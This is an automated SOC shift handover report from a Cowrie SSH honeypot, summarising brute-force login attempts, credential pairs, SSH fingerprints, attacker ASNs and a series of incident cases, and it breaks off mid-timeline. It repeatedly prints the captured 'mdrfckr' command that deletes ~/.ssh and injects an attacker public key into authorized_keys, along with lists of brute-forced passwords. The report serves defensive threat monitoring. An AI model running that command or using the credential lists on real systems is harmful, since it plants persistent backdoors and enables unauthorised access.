# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-22 |
| **Generated At** | 2026-04-22T19:20:29Z |
| **Shift Time** | 19:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **258** |
| Confirmed Threats | **250** |
| False Positives Filtered | **8** (3.1%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **10** |
| High Severity Cases | **106** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **152** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **245** |
| Unique Credential Pairs | **113** |
| Unique Usernames | **50** |
| Unique Passwords | **106** |
| Successful Auth Pairs | **61** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 106 |
| `345gs5662d34` | 52 |
| `ubuntu` | 14 |
| `admin1234` | 5 |
| `frappe` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 52 |
| `3245gs5662d34` | 52 |
| `123456` | 10 |
| `admin1234` | 5 |
| `Admin0` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 52 |
| `root` | `3245gs5662d34` | 52 |
| `admin1234` | `admin1234` | 5 |
| `admin` | `Admin0` | 2 |
| `odoo` | `Odoo19` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qazwsx12345678!@` | `36.103.243.179` | 2026-04-22T17:44:36 |
| `root` | `3245gs5662d34` | `36.103.243.179` | 2026-04-22T17:44:40 |
| `root` | `Qazwsx123321@` | `36.103.243.179` | 2026-04-22T17:45:03 |
| `root` | `qazwsx321$` | `36.103.243.179` | 2026-04-22T17:45:16 |
| `root` | `555666` | `36.103.243.179` | 2026-04-22T17:45:48 |
| `root` | `aezakmi` | `36.103.243.179` | 2026-04-22T17:46:16 |
| `root` | `qwe1234@` | `36.103.243.179` | 2026-04-22T17:46:29 |
| `root` | `ChangeMe` | `36.103.243.179` | 2026-04-22T17:46:45 |
| `root` | `Tm@123456` | `36.103.243.179` | 2026-04-22T17:46:58 |
| `root` | `admin12345..` | `36.103.243.179` | 2026-04-22T17:47:45 |
| `root` | `admin0$` | `36.103.243.179` | 2026-04-22T17:47:57 |
| `root` | `Qazwsx2020@123` | `36.103.243.179` | 2026-04-22T17:48:24 |
| `root` | `qwert` | `43.130.90.166` | 2026-04-22T17:48:27 |
| `root` | `3245gs5662d34` | `43.130.90.166` | 2026-04-22T17:48:33 |
| `root` | `arthur` | `36.103.243.179` | 2026-04-22T17:49:03 |
| `root` | `Aa@1234` | `36.103.243.179` | 2026-04-22T17:49:34 |
| `root` | `123456+` | `43.130.90.166` | 2026-04-22T17:49:43 |
| `root` | `abc@123.com` | `36.103.243.179` | 2026-04-22T17:49:48 |
| `root` | `Qweqwe111` | `43.130.90.166` | 2026-04-22T17:50:22 |
| `root` | `Root654321` | `43.130.90.166` | 2026-04-22T17:51:01 |
| `root` | `Qazwsx0@@` | `43.130.90.166` | 2026-04-22T17:52:53 |
| `root` | `Root2018@@` | `43.130.90.166` | 2026-04-22T17:55:16 |
| `root` | `CCqq1234` | `43.130.90.166` | 2026-04-22T17:55:53 |
| `root` | `test@123` | `43.130.90.166` | 2026-04-22T17:57:08 |
| `root` | `Aa123b` | `43.130.90.166` | 2026-04-22T17:59:00 |
| `root` | `passwd` | `43.130.90.166` | 2026-04-22T17:59:43 |
| `root` | `123456@Ab` | `43.130.90.166` | 2026-04-22T18:01:35 |
| `root` | `1q2w3e` | `43.130.90.166` | 2026-04-22T18:02:50 |
| `root` | `1A2s3d4f` | `190.129.122.185` | 2026-04-22T18:04:53 |
| `root` | `3245gs5662d34` | `190.129.122.185` | 2026-04-22T18:05:01 |
| `root` | `1qaz!QAZ!QAZ` | `190.129.122.185` | 2026-04-22T18:06:47 |
| `root` | `1234_zxcv` | `190.129.122.185` | 2026-04-22T18:07:45 |
| `root` | `root111111@` | `190.129.122.185` | 2026-04-22T18:09:42 |
| `root` | `QW12ER34` | `190.129.122.185` | 2026-04-22T18:10:41 |
| `root` | `QWE1234` | `165.154.227.8` | 2026-04-22T18:12:04 |
| `root` | `3245gs5662d34` | `165.154.227.8` | 2026-04-22T18:12:08 |
| `root` | `Qwerty123456!` | `165.154.6.66` | 2026-04-22T18:14:15 |
| `root` | `3245gs5662d34` | `165.154.6.66` | 2026-04-22T18:14:18 |
| `root` | `QW12ER34` | `165.154.6.66` | 2026-04-22T18:15:04 |
| `root` | `qwerty12345!` | `190.129.122.185` | 2026-04-22T18:15:59 |
| `root` | `1A2s3d4f` | `165.154.6.66` | 2026-04-22T18:17:29 |
| `root` | `Qwerty123456!` | `190.129.122.185` | 2026-04-22T18:17:58 |
| `root` | `root111111@` | `165.154.6.66` | 2026-04-22T18:18:18 |
| `root` | `root2018!@#` | `190.129.122.185` | 2026-04-22T18:20:01 |
| `root` | `1qaz!QAZ!QAZ` | `165.154.6.66` | 2026-04-22T18:21:21 |
| `root` | `1234_zxcv` | `165.154.6.66` | 2026-04-22T18:22:08 |
| `root` | `123abc,.` | `190.129.122.185` | 2026-04-22T18:23:02 |
| `root` | `123abc,.` | `165.154.6.66` | 2026-04-22T18:24:27 |
| `root` | `root2018!@#` | `165.154.6.66` | 2026-04-22T18:27:38 |
| `root` | `qwerty12345!` | `165.154.6.66` | 2026-04-22T18:31:34 |
| `root` | `Aa123b` | `31.57.93.201` | 2026-04-22T18:32:16 |
| `root` | `3245gs5662d34` | `31.57.93.201` | 2026-04-22T18:32:21 |
| `root` | `------fuck------` | `115.236.181.242` | 2026-04-22T18:38:49 |
| `root` | `Asdf123456.` | `190.129.122.12` | 2026-04-22T18:43:28 |
| `root` | `3245gs5662d34` | `190.129.122.12` | 2026-04-22T18:43:37 |
| `root` | `Hik12345+` | `190.129.122.12` | 2026-04-22T18:44:36 |
| `root` | `qweasd123` | `190.129.122.12` | 2026-04-22T18:45:52 |
| `root` | `1qaZXsw2` | `190.129.122.12` | 2026-04-22T18:49:07 |
| `root` | `p@ck3tf3nc3` | `190.129.122.12` | 2026-04-22T18:55:41 |
| `root` | `Sp123456` | `190.129.122.12` | 2026-04-22T18:56:46 |
| `root` | `P@$$w0rd2025` | `190.129.122.12` | 2026-04-22T19:05:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **258** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 244 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 139 | 5 |
| `03a80b21afa8...` | Modern SSH client | 104 | 2 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 139 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 104 | 2 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 53 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.6.66`, `190.129.122.12`, `43.130.90.166`, `165.154.227.8`, `31.57.93.201`, `190.129.122.185`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **15** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS6568` | EMPRESA NACIONAL DE TELECOMUNICACIONES SOCIEDAD ANONIMA | 2 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS142002` | Scloud Pte Ltd | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS701` | Verizon Business | 1 | LOW |
| `AS396982` | Google LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (104)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4b7c58f20633

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:44 |
| **Last Seen** | 2026-04-22 17:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:44:35` | `cowrie.session.connect` |
| `2026-04-22 17:44:35` | `cowrie.client.version` |
| `2026-04-22 17:44:35` | `cowrie.client.kex` |
| `2026-04-22 17:44:36` | `cowrie.login.success` |
| `2026-04-22 17:44:36` | `cowrie.session.params` |
| `2026-04-22 17:44:36` | `cowrie.command.input` |
| `2026-04-22 17:44:36` | `cowrie.command.failed` |
| `2026-04-22 17:44:36` | `cowrie.log.closed` |
| `2026-04-22 17:44:37` | `cowrie.session.params` |
| `2026-04-22 17:44:37` | `cowrie.command.input` |
| `2026-04-22 17:44:37` | `cowrie.session.file_download` |
| `2026-04-22 17:44:37` | `cowrie.log.closed` |
| `2026-04-22 17:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185090b1bbe7

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:44 |
| **Last Seen** | 2026-04-22 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:44:39` | `cowrie.session.connect` |
| `2026-04-22 17:44:39` | `cowrie.client.version` |
| `2026-04-22 17:44:40` | `cowrie.client.kex` |
| `2026-04-22 17:44:40` | `cowrie.login.success` |
| `2026-04-22 17:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa371e072bc

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:45 |
| **Last Seen** | 2026-04-22 17:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:45:02` | `cowrie.session.connect` |
| `2026-04-22 17:45:02` | `cowrie.client.version` |
| `2026-04-22 17:45:02` | `cowrie.client.kex` |
| `2026-04-22 17:45:03` | `cowrie.login.success` |
| `2026-04-22 17:45:03` | `cowrie.session.params` |
| `2026-04-22 17:45:03` | `cowrie.command.input` |
| `2026-04-22 17:45:03` | `cowrie.command.failed` |
| `2026-04-22 17:45:03` | `cowrie.log.closed` |
| `2026-04-22 17:45:04` | `cowrie.session.params` |
| `2026-04-22 17:45:04` | `cowrie.command.input` |
| `2026-04-22 17:45:04` | `cowrie.session.file_download` |
| `2026-04-22 17:45:04` | `cowrie.log.closed` |
| `2026-04-22 17:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf81d2ae8e77

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:45 |
| **Last Seen** | 2026-04-22 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:45:06` | `cowrie.session.connect` |
| `2026-04-22 17:45:06` | `cowrie.client.version` |
| `2026-04-22 17:45:06` | `cowrie.client.kex` |
| `2026-04-22 17:45:07` | `cowrie.login.success` |
| `2026-04-22 17:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf54265bb5ab

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:45 |
| **Last Seen** | 2026-04-22 17:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:45:16` | `cowrie.session.connect` |
| `2026-04-22 17:45:16` | `cowrie.client.version` |
| `2026-04-22 17:45:16` | `cowrie.client.kex` |
| `2026-04-22 17:45:16` | `cowrie.login.success` |
| `2026-04-22 17:45:17` | `cowrie.session.params` |
| `2026-04-22 17:45:17` | `cowrie.command.input` |
| `2026-04-22 17:45:17` | `cowrie.command.failed` |
| `2026-04-22 17:45:17` | `cowrie.log.closed` |
| `2026-04-22 17:45:17` | `cowrie.session.params` |
| `2026-04-22 17:45:17` | `cowrie.command.input` |
| `2026-04-22 17:45:17` | `cowrie.session.file_download` |
| `2026-04-22 17:45:17` | `cowrie.log.closed` |
| `2026-04-22 17:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917dcc9bcfa7

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:45 |
| **Last Seen** | 2026-04-22 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:45:20` | `cowrie.session.connect` |
| `2026-04-22 17:45:20` | `cowrie.client.version` |
| `2026-04-22 17:45:20` | `cowrie.client.kex` |
| `2026-04-22 17:45:20` | `cowrie.login.success` |
| `2026-04-22 17:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e439a6dc691d

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:45 |
| **Last Seen** | 2026-04-22 17:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:45:47` | `cowrie.session.connect` |
| `2026-04-22 17:45:47` | `cowrie.client.version` |
| `2026-04-22 17:45:47` | `cowrie.client.kex` |
| `2026-04-22 17:45:48` | `cowrie.login.success` |
| `2026-04-22 17:45:48` | `cowrie.session.params` |
| `2026-04-22 17:45:48` | `cowrie.command.input` |
| `2026-04-22 17:45:48` | `cowrie.command.failed` |
| `2026-04-22 17:45:48` | `cowrie.log.closed` |
| `2026-04-22 17:45:49` | `cowrie.session.params` |
| `2026-04-22 17:45:49` | `cowrie.command.input` |
| `2026-04-22 17:45:49` | `cowrie.session.file_download` |
| `2026-04-22 17:45:49` | `cowrie.log.closed` |
| `2026-04-22 17:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4932eafe5e6a

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:45 |
| **Last Seen** | 2026-04-22 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:45:51` | `cowrie.session.connect` |
| `2026-04-22 17:45:51` | `cowrie.client.version` |
| `2026-04-22 17:45:51` | `cowrie.client.kex` |
| `2026-04-22 17:45:52` | `cowrie.login.success` |
| `2026-04-22 17:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3621fe976b1f

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:46 |
| **Last Seen** | 2026-04-22 17:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:46:16` | `cowrie.session.connect` |
| `2026-04-22 17:46:16` | `cowrie.client.version` |
| `2026-04-22 17:46:16` | `cowrie.client.kex` |
| `2026-04-22 17:46:16` | `cowrie.login.success` |
| `2026-04-22 17:46:17` | `cowrie.session.params` |
| `2026-04-22 17:46:17` | `cowrie.command.input` |
| `2026-04-22 17:46:17` | `cowrie.command.failed` |
| `2026-04-22 17:46:17` | `cowrie.log.closed` |
| `2026-04-22 17:46:17` | `cowrie.session.params` |
| `2026-04-22 17:46:17` | `cowrie.command.input` |
| `2026-04-22 17:46:17` | `cowrie.session.file_download` |
| `2026-04-22 17:46:17` | `cowrie.log.closed` |
| `2026-04-22 17:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb353a152354

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:46 |
| **Last Seen** | 2026-04-22 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:46:20` | `cowrie.session.connect` |
| `2026-04-22 17:46:20` | `cowrie.client.version` |
| `2026-04-22 17:46:20` | `cowrie.client.kex` |
| `2026-04-22 17:46:20` | `cowrie.login.success` |
| `2026-04-22 17:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c3cd411cbc5

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:46 |
| **Last Seen** | 2026-04-22 17:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:46:28` | `cowrie.session.connect` |
| `2026-04-22 17:46:28` | `cowrie.client.version` |
| `2026-04-22 17:46:28` | `cowrie.client.kex` |
| `2026-04-22 17:46:29` | `cowrie.login.success` |
| `2026-04-22 17:46:29` | `cowrie.session.params` |
